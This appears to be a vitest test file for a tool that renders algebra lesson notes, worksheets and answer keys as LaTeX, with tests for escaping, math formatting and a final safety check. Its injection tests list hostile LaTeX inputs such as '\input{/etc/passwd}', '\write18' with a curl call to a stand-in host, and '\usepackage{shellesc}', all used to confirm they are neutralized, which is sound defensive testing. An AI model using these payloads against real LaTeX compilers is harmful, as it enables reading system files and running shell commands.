import { describe, expect, it } from "vitest";
import { FAKE_PROSE } from "@/lib/llm/fake";
import { escapeText, RenderError } from "@/lib/latex/escape";
import { equationTex, numberTex, operationText, solutionText } from "@/lib/latex/math";
import { assertTexIsSafe, renderDocument, renderPackage, TEMPLATE_VERSION } from "@/lib/latex/render";
import { ALLOWED_BODY_COMMANDS, preamble } from "@/lib/latex/templates";
import { buildPackage } from "@/lib/package/build";
import type { ProseDraft } from "@/lib/package/prose";
import type { LessonPackage } from "@/lib/package/schema";
import { Rng } from "@/lib/math/rng";
import { testContext, testPackage, testRequest } from "../fixtures/package";

/** What may remain once every escape sequence the escaper emits is removed. */
const ESCAPES = /\\(?:textbackslash|textasciitilde|textasciicircum|textless|textgreater|textbar|textquotedbl|ldots)\{\}|\\[{}$&#_%]|\{[[\]]\}/g;
const DANGEROUS = /[\\{}$&#%^_~<>|"\n]/;

describe("escaping text", () => {
  it("escapes every LaTeX special character", () => {
    expect(escapeText("50% of $5 & #1_a ~ ^ \\ { } < > | \"")).toBe("50\\% of \\$5 \\& \\#1\\_a \\textasciitilde{} \\textasciicircum{} \\textbackslash{} \\{ \\} \\textless{} \\textgreater{} \\textbar{} \\textquotedbl{}");
  });
  it("keeps ordinary words, Latin accents and typographic punctuation, mapped to what the fonts print", () => {
    expect(escapeText("Café déjà vu – “quoted” ‘single’ … naïve")).toBe("Café déjà vu -- ``quoted'' `single' \\ldots{} naïve");
  });
  it("replaces what the fonts cannot print instead of passing it through", () => {
    expect(escapeText("ok 😀 日本語 \u0000 \u202e end")).toBe("ok ? ??? ? ? end");
  });
  it("turns line breaks and tabs into spaces", () => {
    expect(escapeText("a\nb\r\nc\td")).toBe("a b c d");
  });
  it("neutralizes every injection attempt: no command, brace, comment or ^^ notation survives", () => {
    const attacks = [
      "\\input{/etc/passwd}",
      "\\write18{id}",
      "\\immediate\\write18{curl http://evil}",
      "\\openin1=/etc/passwd",
      "\\catcode`\\%=12 % comment",
      "^^5cinput{/etc/passwd}",
      "}\\end{document}\\begin{document}{",
      "$\\def\\x{\\x\\x}\\x$",
      "\\verb|x|",
      "\\usepackage{shellesc}",
    ];
    for (const attack of attacks) {
      const out = escapeText(attack);
      expect(out.replace(ESCAPES, ""), attack).not.toMatch(DANGEROUS);
      expect(out, attack).not.toMatch(/\\input|\\write|\\def\b|\\openin|\\catcode|\\usepackage|\\verb\b/); // only as \textbackslash{}input etc.
    }
  });
  it("holds for random text over a wide alphabet (seeded fuzz)", () => {
    const rng = new Rng("escape-fuzz");
    const alphabet = Array.from("\\{}$&#%^_~<>|\"'`[]()-=+*/@.,;:!? \n\tAaZz09éÉ–—“”…😀日\u0000\u202e");
    for (let i = 0; i < 400; i++) {
      const text = Array.from({ length: rng.int(0, 60) }, () => alphabet[rng.int(0, alphabet.length - 1)]!).join("");
      const out = escapeText(text);
      expect(out.replace(ESCAPES, ""), JSON.stringify(text)).not.toMatch(DANGEROUS);
    }
  });
  it("refuses absurdly long text", () => {
    expect(() => escapeText("a".repeat(5001))).toThrow(RenderError);
  });
});

describe("math as LaTeX", () => {
  const eq = (lx: string[], lc: string[], rx: string[], rc: string[]) => ({ lhs: { x: lx, c: lc }, rhs: { x: rx, c: rc } });
  it("formats equations from exact numbers", () => {
    expect(equationTex(eq(["3"], ["5"], [], ["20"]))).toBe("3x + 5 = 20");
    expect(equationTex(eq(["-6"], ["7"], [], ["-11"]))).toBe("-6x + 7 = -11");
    expect(equationTex(eq(["2"], ["-3"], ["-1"], ["4"]))).toBe("2x - 3 = -x + 4");
    expect(equationTex(eq(["3/4"], ["-1/2"], [], ["2"]))).toBe("\\frac{3}{4}x - \\frac{1}{2} = 2");
    expect(equationTex(eq(["1"], [], [], ["-7"]))).toBe("x = -7");
    expect(equationTex(eq([], [], [], ["0"]))).toBe("0 = 0");
  });
  it("words each operation in plain English around the validated value", () => {
    expect(operationText({ type: "add_const_both_sides", value: "-5" })).toBe("Subtract $5$ from both sides");
    expect(operationText({ type: "add_const_both_sides", value: "4" })).toBe("Add $4$ to both sides");
    expect(operationText({ type: "add_x_term_both_sides", value: "-2" })).toBe("Subtract $2x$ from both sides");
    expect(operationText({ type: "add_x_term_both_sides", value: "1" })).toBe("Add $x$ to both sides");
    expect(operationText({ type: "multiply_both_sides", value: "-3" })).toBe("Multiply both sides by $-3$");
    expect(operationText({ type: "divide_both_sides", value: "3/4" })).toBe("Divide both sides by $\\frac{3}{4}$");
  });
  it("words each kind of solution", () => {
    expect(solutionText({ kind: "unique", value: "-9/2" })).toBe("$x = -\\frac{9}{2}$");
    expect(solutionText({ kind: "no_solution" })).toMatch(/^No solution/);
    expect(solutionText({ kind: "identity" })).toMatch(/^Every number is a solution/);
  });
  it("never lets a non-number, an unknown operation or an unknown solution through", () => {
    for (const bad of ["x", "3; \\input{a}", "1.5", "1e3", "", "3/0"]) {
      expect(() => numberTex(bad), bad).toThrow(RenderError);
      expect(() => equationTex(eq([bad], [], [], ["1"])), bad).toThrow(RenderError);
    }
    expect(() => operationText({ type: "run_script", value: "1" })).toThrow(RenderError);
    expect(() => solutionText({ kind: "approximately", value: "1" })).toThrow(RenderError);
    expect(() => solutionText({ kind: "unique" })).toThrow(RenderError);
  });
});

describe("rendering a package", () => {
  const pkg = testPackage();
  it("is deterministic and records the template version", () => {
    expect(renderPackage(pkg)).toEqual(renderPackage(testPackage()));
    expect(renderDocument(pkg, "notes").templateVersion).toBe(TEMPLATE_VERSION);
    expect(renderDocument(testPackage({}, "another-seed"), "worksheet").tex).not.toBe(renderDocument(pkg, "worksheet").tex);
  });
  it("renders exactly the requested documents", () => {
    expect(renderPackage(pkg).map((d) => d.id)).toEqual(["notes", "worksheet", "solutions"]);
    expect(renderPackage(testPackage({ documents: ["solutions", "notes"] })).map((d) => d.id)).toEqual(["solutions", "notes"]);
    expect(() => renderDocument(testPackage({ documents: ["notes"] }), "worksheet")).toThrow(RangeError);
  });
  it("the worksheet contains the exercises and no answer, step or solution wording", () => {
    for (const difficulty of ["basic", "mixed", "challenge"] as const) {
      const p = testPackage({ difficulty }, `ws-${difficulty}`);
      const worksheet = renderDocument(p, "worksheet").tex;
      const solutions = p.sections.find((s) => s.kind === "solutions")!;
      for (const block of solutions.blocks) {
        if (block.type !== "solution") continue;
        expect(worksheet, block.questionId).not.toContain(solutionText(block.solution));
        for (const step of block.steps) expect(worksheet).not.toContain(operationText(step.op));
      }
      expect(worksheet).not.toMatch(/Answer|Solutions|Subtract|Divide both|Multiply both|both sides|worked/i);
      expect(worksheet.match(/Solve for \$x\$/g)?.length).toBe(solutions.blocks.filter((b) => b.type === "solution").length);
    }
  });
  it("each worksheet question is one unbreakable box with its writing space", () => {
    const tex = renderDocument(pkg, "worksheet").tex;
    const questions = tex.match(/Solve for \$x\$/g)?.length ?? 0;
    expect(tex.match(/\\begin\{minipage\}\{\\linewidth\}/g)?.length).toBe(questions);
    expect(tex.match(/\\end\{minipage\}/g)?.length).toBe(questions);
    for (const box of tex.split("\\begin{minipage}{\\linewidth}").slice(1)) expect(box.split("\\end{minipage}")[0]).toContain("\\writeline");
  });
  it("the answer key restates every question and gives every answer", () => {
    const tex = renderDocument(pkg, "solutions").tex;
    const solutions = pkg.sections.find((s) => s.kind === "solutions")!;
    for (const block of solutions.blocks) if (block.type === "solution") expect(tex).toContain(solutionText(block.solution));
    expect(tex).toContain("\\answerline{");
    expect(tex).toContain("AI-assisted material. Review it before teaching.");
  });
  it("the notes carry every section title, the worked examples and a review reminder, and no practice exercises", () => {
    const tex = renderDocument(pkg, "notes").tex;
    for (const title of ["Learning objectives", "Prerequisites", "Key ideas", "Why the method works", "Worked examples", "Teaching sequence", "Common mistakes"]) expect(tex).toContain(`\\section*{${title}}`);
    expect(tex).toContain("\\textbf{Example 1.}");
    expect(tex).not.toContain("Practice exercises");
    expect(tex).toContain("AI-assisted material. Review it before teaching.");
    expect(tex).toContain("Solve equations with one unknown"); // objective wording comes from the dataset
  });
  it("model-written wording renders the same way", () => {
    const withProse = buildPackage({ request: testRequest(), context: testContext(), seed: "s", prose: { draft: FAKE_PROSE as unknown as ProseDraft, model: "m" } });
    expect(renderDocument(withProse, "notes").tex).toContain("An equation states that two expressions have the same value");
  });
  it("the allowlist is exactly what the renderer emits (no unused permission)", () => {
    const used = new Set<string>();
    for (const difficulty of ["basic", "mixed", "challenge"] as const) {
      for (const kind of ["sample", "real"] as const) {
        for (const doc of renderPackage(testPackage({ difficulty, durationMinutes: 120 }, `used-${difficulty}`, kind))) {
          for (const m of doc.tex.slice(preamble(doc.id).length).matchAll(/\\([A-Za-z@]+)/g)) used.add(m[1]!);
        }
      }
    }
    for (const name of used) expect(ALLOWED_BODY_COMMANDS.has(name), name).toBe(true);
    const unused = [...ALLOWED_BODY_COMMANDS].filter((n) => !used.has(n));
    // only escape sequences for characters that did not occur in this test data may be unused
    expect(unused.filter((n) => !/^text|^ldots$/.test(n))).toEqual([]);
  });
  it("every package renders to source that passes the safety check, across difficulties, lengths and datasets", () => {
    for (const difficulty of ["basic", "mixed", "challenge"] as const) {
      for (const durationMinutes of [15, 45, 90, 180]) {
        for (const kind of ["sample", "real"] as const) {
          const p = testPackage({ difficulty, durationMinutes }, `all-${difficulty}-${durationMinutes}-${kind}`, kind);
          for (const doc of renderPackage(p)) expect(() => assertTexIsSafe(doc.tex, doc.id), `${difficulty}/${durationMinutes}/${kind}/${doc.id}`).not.toThrow();
        }
      }
    }
  });
});

describe("curriculum statements in the documents", () => {
  it("sample data says plainly that no alignment is claimed and that it is not a real curriculum", () => {
    const p = testPackage();
    const notes = renderDocument(p, "notes").tex;
    expect(notes).toContain("No curriculum alignment is claimed for this material.");
    expect(notes).toContain("sample data (Fictional Mathematics Programme (Fiction Edition 7)) that is not a real curriculum");
    expect(notes).not.toMatch(/This lesson addresses objectives/);
    expect(renderDocument(p, "worksheet").tex).toContain("No curriculum alignment is claimed.");
    expect(renderDocument(p, "solutions").tex).toContain("No curriculum alignment is claimed.");
  });
  it("a dataset that allows alignment produces the full statement in the notes and a short one elsewhere", () => {
    const p = testPackage({}, "s", "real");
    const notes = renderDocument(p, "notes").tex;
    expect(notes).toContain("This lesson addresses objectives from Fictional Mathematics Programme (Fiction Edition 7):");
    expect(notes).toContain("FIC-E.1: Solve equations with one unknown");
    expect(notes).toContain("FIC-E.2: Check a solution by substitution \\textit{(partly covered: substitution only)}");
    expect(renderDocument(p, "worksheet").tex).toContain("Curriculum: Fictional Mathematics Programme (Fiction Edition 7).");
    expect(renderDocument(p, "worksheet").tex).not.toContain("FIC-E.1");
  });
  it("hostile dataset text is printed literally and cannot add a command", () => {
    const hostile = "\\input{/etc/passwd} $x$ % {\\write18{id}} ^^5c &";
    const context = testContext("real", {
      curriculum: { ...testContext().curriculum, name: hostile, version: { ...testContext().curriculum.version, kind: "real", label: "Edition #1_a" } },
      topic: { id: "t1", title: hostile },
      objectives: [{ id: "o1", officialCode: "X~1", label: hostile, coverage: "full", note: null, source: { ref: "r", page: null } }],
    });
    const p = buildPackage({ request: testRequest(), context, seed: "s" });
    for (const doc of renderPackage(p)) {
      expect(doc.tex).not.toMatch(/\\input|\\write18/);
      expect(doc.tex).toContain("\\textbackslash{}input");
    }
  });
});

describe("the final safety check", () => {
  const good = renderDocument(testPackage(), "notes").tex;
  const withBody = (extra: string) => good.replace("\\end{document}", `${extra}\n\\end{document}`);
  it("accepts a rendered document", () => {
    expect(() => assertTexIsSafe(good, "notes")).not.toThrow();
  });
  it.each([
    ["an \\input", "\\input{/etc/passwd}"],
    ["a \\write18", "\\immediate\\write18{id}"],
    ["a \\def", "\\def\\x{y}"],
    ["a \\catcode", "\\catcode`\\%=12"],
    ["a package load", "\\usepackage{shellesc}"],
    ["an \\openin", "\\openin1=secret"],
    ["a comment", "text % hidden"],
    ["^^ notation", "^^5cinput"],
    ["a parameter sign", "#1"],
    ["an unknown control symbol", "\\@x \\^a"],
  ])("rejects %s", (_name, extra) => {
    expect(() => assertTexIsSafe(withBody(extra), "notes")).toThrow(RenderError);
  });
  it("rejects a changed preamble and an oversized source", () => {
    expect(() => assertTexIsSafe(good.replace("\\usepackage{amsmath}", "\\usepackage{amsmath}\\usepackage{verbatim}"), "notes")).toThrow(RenderError);
    expect(() => assertTexIsSafe(good + "a".repeat(300_001), "notes")).toThrow(RenderError);
  });
  it("a worksheet checked as a different document fails (the header is part of the fixed preamble)", () => {
    expect(() => assertTexIsSafe(good, "worksheet")).toThrow(RenderError);
    expect(preamble("notes")).not.toBe(preamble("worksheet"));
  });
});

// type-level: the helper must hand back a real LessonPackage
const _typed: LessonPackage = testPackage();
void _typed;
